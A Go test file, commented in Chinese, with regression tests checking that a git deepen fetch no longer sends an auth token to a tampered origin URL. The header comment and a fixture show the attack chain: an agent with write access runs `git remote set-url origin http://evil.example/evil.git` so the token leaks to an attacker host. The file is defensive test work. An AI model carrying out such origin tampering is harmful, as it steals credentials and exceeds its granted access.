package workcopy

// tools#184 回归钉：deepen 的 ensureMergeBase 是 #176 refresh 同款 token 外带
// 通道的第二入口——Token != "" 时 fetch 目标 "origin" 由 git 读 .git/config
// 解析、鉴权 scheme 从可被工作树写手篡改的 origin URL 反推。攻击链：工作树
// 内 `git remote set-url origin http://evil.example/evil.git` → 触发 deepen →
// token 以 extraheader 附加到对攻击者主机的 fetch（http 形态全程明文）。
// 修后：DeepenOptions 增加期望 clone 源（BaseURL/Owner/Repo，WithCloneSource
// 原子设置），fetch 目标由 cloneURL 现算（与 #176 refresh 同一单源）、直用
// URL 不读 config——篡改后的 origin 与凭证注入恒脱钩。零值字段退化为旧形态
//（非破坏：既有直连 WithToken 调用方语义不变，文档标 ⚠️ 催迁）。

import (
	"context"
	"encoding/base64"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// tamperFakeGit 记 argv 的伪造 git：merge-base 按次数失败（state 文件计数），
// fetch 恒成功——攻击链判定全看 fetch 的目标 URL 落在 argv 里。
func tamperFakeGit(t *testing.T, probeFailUntil int) string {
	t.Helper()
	bin := t.TempDir()
	probe := filepath.Join(bin, "called")
	state := filepath.Join(bin, "state")
	script := "#!/bin/sh\necho \"$@\" >> " + shq(probe) + "\n" +
		"if [ \"$3\" = \"merge-base\" ]; then\n" +
		"  n=0\n" +
		"  if [ -f " + shq(state) + " ]; then read n < " + shq(state) + "; fi\n" +
		"  n=$((n+1)); echo $n > " + shq(state) + "\n" +
		"  if [ \"$n\" -lt " + strconv.Itoa(probeFailUntil) + " ]; then exit 1; fi\n" +
		"fi\n" +
		"exit 0\n"
	if err := os.WriteFile(filepath.Join(bin, "git"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin)
	return probe
}

// tamperedShallowDir 浅克隆目录 + 被篡改的 origin（攻击步骤①的落盘形态：
// 被审 agent 对 .git/config 有写权）。
func tamperedShallowDir(t *testing.T) string {
	t.Helper()
	dir := shallowDir(t)
	cfg := "[remote \"origin\"]\n\turl = http://evil.example/evil.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
	if err := os.WriteFile(filepath.Join(dir, ".git", "config"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// TestDeepenTamperedOriginNoTokenExfil_Issue184 攻击链复现（Pool 形态）：
// 篡改 origin → 触发 deepen。修后必须：fetch 目标是 cloneURL 现算的可信 URL
// （与 prepare/refresh 同源），config 里的攻击者 URL 既不是 fetch 目标、也不
// 参与 scheme 反推——token 只随可信 URL 走，不外带。
func TestDeepenTamperedOriginNoTokenExfil_Issue184(t *testing.T) {
	probe := tamperFakeGit(t, 2) // 第 2 次 merge-base 起成功 → 恰好一轮 deepen
	p := NewPool(t.TempDir(), nil)
	p.CredentialOf = func(string) (string, string, bool) { return "http://trusted.example", "secret-token", true }
	key := WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1"}
	if err := p.EnsureMergeBase(context.Background(), tamperedShallowDir(t), key,
		"main", 10*time.Second); err != nil {
		t.Fatalf("篡改 origin 后 deepen 失败：%v（tools#184 修后应直用现算 URL）", err)
	}
	argv := readArgv(t, probe)
	// fetch 目标 = cloneURL 现算（http 形态保留原 scheme——内网 http 合法）
	wantTarget := "fetch --deepen=64 http://trusted.example/o/r.git +refs/heads/*:refs/remotes/origin/*"
	if !strings.Contains(argv, wantTarget) {
		t.Fatalf("fetch 应直用现算的可信 URL（tools#184）: %s", argv)
	}
	if strings.Contains(argv, "evil") {
		t.Fatalf("被篡改的 origin 不得出现在任何 argv 里（token 不随 config 走）: %s", argv)
	}
	if strings.Contains(argv, " get-url ") {
		t.Fatalf("修后不得再读 config 反推 scheme: %s", argv)
	}
	// token 照常注入（可信 host 是 http 形态，鉴权面在）——与 #176 同款纪律：
	// 脱钩的是 config，不是鉴权本身。
	wantAuth := base64.StdEncoding.EncodeToString([]byte("oauth2:secret-token"))
	if !strings.Contains(argv, "http.extraheader=Authorization: Basic "+wantAuth) {
		t.Fatalf("可信 host 的 http fetch 仍须带鉴权注入: %s", argv)
	}
	if i, j := strings.Index(argv, "http.extraheader"), strings.Index(argv, " fetch "); i > j {
		t.Fatalf("-c 必须在 fetch 子命令之前: %s", argv)
	}
}

// TestDeepenFileSourceZeroAuthFace_Issue184 file:// 可信源 + 被篡改成 http://
// 的 config：修后 scheme 恒取自现算 URL（file:// 无鉴权面，authGitArgs 返回
// nil）——token 在 file:// 形态下根本不进 argv，config 反推的 http scheme
// 无法再把它激活（修前形态：extraheader 照常附加到对 evil.example 的 fetch）。
func TestDeepenFileSourceZeroAuthFace_Issue184(t *testing.T) {
	probe := tamperFakeGit(t, 2)
	p := NewPool(t.TempDir(), nil)
	fixture := t.TempDir()
	p.CredentialOf = func(string) (string, string, bool) { return "file://" + fixture, "secret-token", true }
	key := WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1"}
	if err := p.EnsureMergeBase(context.Background(), tamperedShallowDir(t), key,
		"main", 10*time.Second); err != nil {
		t.Fatalf("file:// 源 deepen 失败: %v", err)
	}
	argv := readArgv(t, probe)
	if !strings.Contains(argv, "fetch --deepen=64 file://"+fixture) {
		t.Fatalf("fetch 应直用 file:// 现算 URL: %s", argv)
	}
	if strings.Contains(argv, "http.extraheader") {
		t.Fatalf("file:// 源无鉴权面，token 不得进 argv: %s", argv)
	}
	if strings.Contains(argv, "evil") {
		t.Fatalf("篡改后的 origin 不得出现在任何 argv 里: %s", argv)
	}
}

// TestDeepenExplicitOptsBeatPoolInjection_Issue184 直连形态：EnsureMergeBaseOpts
// 显式带期望源照常生效；Pool 形态下显式 WithCloneSource 覆盖自动注入（与
// WithToken 同序纪律——自动注入排在调用方 opts 之前）。
func TestDeepenExplicitOptsBeatPoolInjection_Issue184(t *testing.T) {
	probe := tamperFakeGit(t, 2)
	if err := EnsureMergeBaseOpts(context.Background(), tamperedShallowDir(t), "main",
		10*time.Second, DeepenOptions{Token: "tok184", BaseURL: "https://direct.example", Owner: "o", Repo: "r"}); err != nil {
		t.Fatalf("直连形态 deepen 失败: %v", err)
	}
	if argv := readArgv(t, probe); !strings.Contains(argv, "fetch --deepen=64 https://direct.example/o/r.git") {
		t.Fatalf("EnsureMergeBaseOpts 应直用现算 URL: %s", argv)
	}

	probe2 := tamperFakeGit(t, 2)
	p := NewPool(t.TempDir(), nil)
	p.CredentialOf = func(string) (string, string, bool) { return "http://pool.example", "t", true }
	if err := p.EnsureMergeBase(context.Background(), tamperedShallowDir(t),
		WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1"},
		"main", 10*time.Second, WithCloneSource("https://override.example", "x", "y")); err != nil {
		t.Fatalf("Pool 显式覆盖形态失败: %v", err)
	}
	if argv := readArgv(t, probe2); !strings.Contains(argv, "fetch --deepen=64 https://override.example/x/y.git") {
		t.Fatalf("显式 WithCloneSource 应覆盖 Pool 自动注入: %s", argv)
	}
}

// TestDeepenLegacyFormUnchanged_Issue184 非破坏钉：零值期望源 + WithToken 走
// 旧形态——fetch 目标 "origin"（git 读 config 解析）、scheme 从 config 反推。
// 既有直连调用方语义不变；带 Token 的新调用方应迁移到 WithCloneSource（见
// DeepenOptions.Token 的 ⚠️）。
func TestDeepenLegacyFormUnchanged_Issue184(t *testing.T) {
	probe := authFakeGit(t, 2) // get-url 返回 https origin；fetch 见 extraheader 才放行
	if err := EnsureMergeBase(context.Background(), shallowDir(t), "main",
		10*time.Second, WithToken("legacy-tok")); err != nil {
		t.Fatalf("旧形态（零值期望源）语义应保持不变: %v", err)
	}
	argv := readArgv(t, probe)
	if !strings.Contains(argv, "fetch --deepen=64 origin +refs/heads/*:refs/remotes/origin/*") {
		t.Fatalf("旧形态 fetch 目标应仍为 origin: %s", argv)
	}
	wantAuth := base64.StdEncoding.EncodeToString([]byte("oauth2:legacy-tok"))
	if !strings.Contains(argv, "http.extraheader=Authorization: Basic "+wantAuth) {
		t.Fatalf("旧形态鉴权注入应保持不变: %s", argv)
	}
}

// TestDeepenPartialCloneSourceFails_Issue184 期望源三元组不齐：显式报错
// （fail-closed）而非静默回退旧形态或现算残缺 URL。
func TestDeepenPartialCloneSourceFails_Issue184(t *testing.T) {
	tamperFakeGit(t, 1<<20)
	err := EnsureMergeBaseOpts(context.Background(), tamperedShallowDir(t), "main",
		10*time.Second, DeepenOptions{BaseURL: "https://x.example", Token: "t"})
	if err == nil || !strings.Contains(err.Error(), "WithCloneSource") {
		t.Fatalf("BaseURL 缺 Owner/Repo 应显式报错: %v", err)
	}
}
